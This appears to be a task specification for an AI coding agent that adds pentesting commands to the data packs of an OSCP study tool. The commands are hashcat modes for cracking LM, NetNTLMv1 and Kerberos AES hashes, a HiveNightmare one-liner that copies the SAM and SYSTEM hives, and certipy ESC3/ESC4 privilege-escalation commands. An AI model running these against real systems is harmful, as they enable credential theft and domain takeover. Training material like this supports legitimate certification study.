# TASK-02: Remaining OSCP Curriculum Gaps (Cracking Modes, VSS Hives, ADCS ESC3/ESC4)

**Target Workspace:** `e:\KaliFiles\obol\obol-site\qa`  
**Recommended Model Tier:** Gemini Flash / Cost-Effective Agent  
**House Style:** NEVER use em dashes (`—`) or en dashes (`–`) in any code, comments, JSON strings, or field notes. Use commas, colons, parentheses, or hyphens (` - `).

---

## 1. Strict File Ownership

**You may ONLY edit:**
- `data/packs/cracking_2026_09.json`
- `data/packs/windows_privesc_2026_09.json`
- `data/packs/ad_2026_09.json`
- `data/field-notes.js`
- `assets/engine/parsers/creds.js` (only if needed for NetNTLMv1 / LM hash detection)

**After editing the pack JSON files, you MUST run:**
- `node tools/build-packs.js`
- `node tools/flag-paths.js --emit`
- `node tools/stamp-assets.js`

---

## 2. Critical Invariant: 1:1 Field Notes Pairing

Every move in `data/packs/*.json` has a matching entry in `data/field-notes.js` under `OBOL.FIELD_NOTES[moveId]`.
- `OBOL.FIELD_NOTES[moveId].commands` is an array whose length and order **MUST match `move.commands` 1:1**.
- Whenever you append a command to a move in `data/packs/*.json`, you **MUST** append a matching `{ when, land, look, win, mistakes }` object to `OBOL.FIELD_NOTES[moveId].commands` in `data/field-notes.js`.
- Run `node tools/field-notes-coverage.js` to verify 100% pairing.

---

## 3. Step-by-Step Implementation

### Item A: LM (`-m 3000`), NetNTLMv1 (`-m 5500`), and Kerberos TGS AES (`-m 19600` / `-m 19700`) in `data/packs/cracking_2026_09.json`

1. **`crack-ntlm` (`data/packs/cracking_2026_09.json`)**:
   - Inspect `crack-ntlm`'s `commands` array. Append an LM hash cracking command variant:
     ```json
     {
       "tool": "hashcat",
       "run": "hashcat -m 3000 {{hashfile}} /usr/share/wordlists/rockyou.txt -O",
       "note": "Legacy LM hash mode (-m 3000): when a pwdump/SAM line has a non-empty first half (not aad3b435b51404eeaad3b435b51404ee), crack the 7-char uppercase LM halves first for an instant win."
     }
     ```
   - Add the corresponding `commands[]` entry to `OBOL.FIELD_NOTES['crack-ntlm'].commands` in `data/field-notes.js`.

2. **`crack-netntlmv2` (`data/packs/cracking_2026_09.json`)**:
   - Append a NetNTLMv1 command variant to `crack-netntlmv2`'s `commands` array:
     ```json
     {
       "tool": "hashcat",
       "run": "hashcat -m 5500 {{hashfile}} /usr/share/wordlists/rockyou.txt -O",
       "note": "NetNTLMv1 (-m 5500): when Responder or a downgrade captures a v1 challenge/response (24-byte NT response), use mode 5500 instead of 5600."
     }
     ```
   - Add the corresponding `commands[]` entry to `OBOL.FIELD_NOTES['crack-netntlmv2'].commands` in `data/field-notes.js`.

3. **`crack-tgs` (`data/packs/cracking_2026_09.json`)**:
   - Append AES-128 (`-m 19600`) and AES-256 (`-m 19700`) command variants to `crack-tgs`'s `commands` array:
     ```json
     {
       "tool": "hashcat",
       "run": "hashcat -m 19600 {{hashfile}} /usr/share/wordlists/rockyou.txt --force",
       "note": "Kerberos 5 TGS-REP etype 17 (AES-128, $krb5tgs$17$...): use mode 19600 when the roasted service account enforces AES-128."
     },
     {
       "tool": "hashcat",
       "run": "hashcat -m 19700 {{hashfile}} /usr/share/wordlists/rockyou.txt --force",
       "note": "Kerberos 5 TGS-REP etype 18 (AES-256, $krb5tgs$18$...): use mode 19700 when the roasted ticket header starts with $krb5tgs$18$."
     }
     ```
   - Add the two matching `commands[]` entries to `OBOL.FIELD_NOTES['crack-tgs'].commands` in `data/field-notes.js`.

### Item B: Volume Shadow Copy (`HiveNightmare` / `SeriousSAM`) in `data/packs/windows_privesc_2026_09.json`

1. Locate `windows-old-hives` in `data/packs/windows_privesc_2026_09.json`.
2. Append a Volume Shadow Copy (`HarddiskVolumeShadowCopy1`, CVE-2021-36934 / SeriousSAM) command variant to `windows-old-hives.commands`:
   ```json
   {
     "tool": "cmd",
     "run": "icacls C:\\Windows\\System32\\config\\SAM & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM %TEMP%\\SAM.bak & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM %TEMP%\\SYSTEM.bak",
     "note": "HiveNightmare / SeriousSAM (CVE-2021-36934): if BUILTIN\\Users has read (RX) on System32\\config\\SAM and shadow copies exist, copy SAM and SYSTEM straight from HarddiskVolumeShadowCopy1 as a low-priv user."
   }
   ```
3. Append the matching `commands[]` entry to `OBOL.FIELD_NOTES['windows-old-hives'].commands` in `data/field-notes.js`.

### Item C: ADCS `ESC3` and `ESC4` Command Variants in `data/packs/ad_2026_09.json`

1. Locate `adcs-esc` in `data/packs/ad_2026_09.json`.
2. Inspect `adcs-esc.commands` and append two explicit command variants for **ESC3** (Enrollment Agent -> `-on-behalf-of`) and **ESC4** (Vulnerable Template ACL -> `certipy template -write-default-configuration`):
   ```json
   {
     "tool": "certipy",
     "run": "certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{target}} -ca '{{ca_name}}' -template '{{cert_template}}' && certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{target}} -ca '{{ca_name}}' -template User -on-behalf-of '{{domain}}\\administrator' -pfx {{user}}.pfx",
     "note": "ESC3 (Enrollment Agent): first request the Certificate Request Agent template, then use that .pfx with -on-behalf-of to request a User certificate for Administrator."
   },
   {
     "tool": "certipy",
     "run": "certipy template -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{target}} -template '{{cert_template}}' -save-old -write-default-configuration",
     "note": "ESC4 (Template Write ACL): when your user holds WriteProperty/WriteDacl on a template, flip it to an ESC1-vulnerable configuration (-save-old backs up the original so you can restore it with -configuration)."
   }
   ```
3. Append the two matching `commands[]` entries to `OBOL.FIELD_NOTES['adcs-esc'].commands` in `data/field-notes.js`.

---

## 4. Verification Checklist (Must All Pass Before Completion)

Run from `e:\KaliFiles\obol\obol-site\qa`:
```powershell
node tools/build-packs.js
node tools/flag-paths.js --emit
node tools/field-notes-coverage.js
node tools/lint-study.js --check
node tools/move-lint.js --check
node tools/gate-audit.js --check
node tools/gap-report.js --check
node tools/post-parse-audit.js --check
node tools/ranker-sim.js
node tools/ranker-sweep.js
node tools/stamp-assets.js
```
All commands must exit with code `0`, `ranker-sim.js` must be `0 / 49`, and `field-notes-coverage.js` must report 100% coverage.
